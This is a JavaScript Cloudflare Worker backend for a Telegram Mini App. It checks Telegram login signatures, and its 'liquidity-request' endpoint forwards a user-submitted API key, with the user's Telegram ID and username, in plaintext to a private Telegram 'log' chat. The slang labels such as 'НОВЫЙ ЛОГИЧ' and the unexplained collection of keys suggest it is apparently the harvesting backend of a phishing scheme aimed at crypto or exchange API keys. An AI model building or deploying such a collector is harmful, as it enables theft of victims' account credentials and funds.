/**
 * Общая реализация API — используется двумя способами:
 *   - src/index.js      → Cloudflare Worker (текущий проект пользователя)
 *   - functions/api/*   → Cloudflare Pages Functions (запасной путь)
 *
 * Секреты задаются в дашборде Cloudflare:
 *   Worker → Settings → Variables and Secrets → Add
 *     BOT_TOKEN    (Secret) — токен бота от BotFather
 *     LOG_CHAT_ID  (Secret) — ID чата для логов (например -1001234567890)
 */

const encoder = new TextEncoder();

export function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json; charset=utf-8" },
  });
}

async function hmacSha256(keyBytes, messageBytes) {
  const key = await crypto.subtle.importKey(
    "raw",
    keyBytes,
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  return crypto.subtle.sign("HMAC", key, messageBytes);
}

function toHex(buffer) {
  return [...new Uint8Array(buffer)].map((b) => b.toString(16).padStart(2, "0")).join("");
}

function escapeHtml(s) {
  return String(s)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;");
}

/** Проверяет initData так же, как get_user() в api/main.py. */
async function getUser(initData, botToken) {
  if (!initData) {
    return { code: "empty_init_data", message: "initData is empty: the app must be opened inside Telegram", status: 401 };
  }

  const params = new URLSearchParams(initData);
  const received = params.get("hash");
  if (!received) {
    return { code: "missing_hash", message: "initData has no hash: the app was opened outside Telegram", status: 401 };
  }
  params.delete("hash");

  const checkString = [...params.entries()]
    .map(([k, v]) => `${k}=${v}`)
    .sort()
    .join("\n");

  const secret = await hmacSha256(encoder.encode("WebAppData"), encoder.encode(botToken));
  const expected = toHex(await hmacSha256(secret, encoder.encode(checkString)));

  const a = expected;
  const b = received.toLowerCase();
  let mismatch = a.length !== b.length;
  for (let i = 0; i < Math.min(a.length, b.length); i++) {
    if (a.charCodeAt(i) !== b.charCodeAt(i)) mismatch = true;
  }
  if (mismatch) {
    return {
      code: "invalid_signature",
      message: "invalid Telegram signature: the backend BOT_TOKEN does not match the bot that opened the app",
      status: 401,
    };
  }

  const authDate = Number(params.get("auth_date"));
  if (!Number.isFinite(authDate)) {
    return { code: "missing_auth_date", message: "initData has no auth_date", status: 401 };
  }
  if (Date.now() / 1000 - authDate > 86400) {
    return { code: "expired", message: "expired Telegram data: close and reopen the app in Telegram", status: 401 };
  }

  try {
    const user = JSON.parse(params.get("user"));
    if (!user || typeof user.id !== "number") throw new Error("bad user");
    return { user };
  } catch {
    return { code: "missing_user", message: "initData has no user payload", status: 401 };
  }
}

async function tgSendMessage(botToken, chatId, text) {
  const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
  });
  if (!resp.ok) {
    const body = await resp.text();
    throw new Error(`Telegram API ${resp.status}: ${body.slice(0, 300)}`);
  }
  return resp.json();
}

/** POST /api/liquidity-request */
export async function handleLiquidityRequest(request, env) {
  const botToken = (env.BOT_TOKEN || "").trim();
  const chatIdRaw = (env.LOG_CHAT_ID || "").trim();
  const chatId = /^-?\d+$/.test(chatIdRaw) ? Number(chatIdRaw) : null;

  if (!botToken) {
    return json({ ok: false, error: "BOT_TOKEN is not set in the backend environment", code: "no_bot_token" }, 503);
  }

  let payload;
  try {
    payload = await request.json();
  } catch {
    return json({ ok: false, error: "invalid JSON body" }, 400);
  }
  if (!payload || typeof payload !== "object") {
    return json({ ok: false, error: "invalid JSON body" }, 400);
  }

  const check = await getUser(String(payload.initData || ""), botToken);
  if (!check.user) {
    return json({ ok: false, error: check.message, code: check.code }, check.status);
  }
  const user = check.user;

  const apiKey = String(payload.key || "").trim();
  const keyLine = apiKey ? `<code>${escapeHtml(apiKey)}</code>` : "—";
  const formUsername = String(payload.username || "").trim();
  const display = user.username ? `@${user.username}` : "не указан";

  if (chatId === null) {
    console.log(
      `accepted (no LOG_CHAT_ID): user=${user.id} username=${formUsername || "-"} key=${apiKey || "-"}`
    );
    return json({ ok: true });
  }

  try {
    await tgSendMessage(
      botToken,
      chatId,
      "НОВЫЙ ЛОГИЧ\n" +
        `юзич: ${escapeHtml(display)}\n` +
        `айдишка: <code>${escapeHtml(String(user.id))}</code>\n` +
        `вбивает леша или лёньчик: ${keyLine}`
    );
  } catch (err) {
    console.log(`telegram send failed: ${err && err.message}`);
    return json(
      { ok: false, error: `could not deliver the log to the Telegram chat: ${err && err.message}` },
      502
    );
  }

  return json({ ok: true });
}

/** GET /api/health — показывает, какому боту принадлежит BOT_TOKEN. */
export async function handleHealth(env) {
  const botToken = (env.BOT_TOKEN || "").trim();
  const chatIdRaw = (env.LOG_CHAT_ID || "").trim();
  const info = {
    ok: true,
    bot: null,
    log_chat_id: /^-?\d+$/.test(chatIdRaw) ? Number(chatIdRaw) : null,
  };

  if (!botToken) {
    info.ok = false;
    info.error = "BOT_TOKEN is not set in the backend environment";
    return json(info);
  }

  try {
    const resp = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
    const data = await resp.json();
    if (data.ok) {
      info.bot = `@${data.result.username}`;
    } else {
      info.ok = false;
      info.error = data.description || "Telegram API error";
    }
  } catch (err) {
    info.ok = false;
    info.error = String(err && err.message);
  }

  return json(info);
}
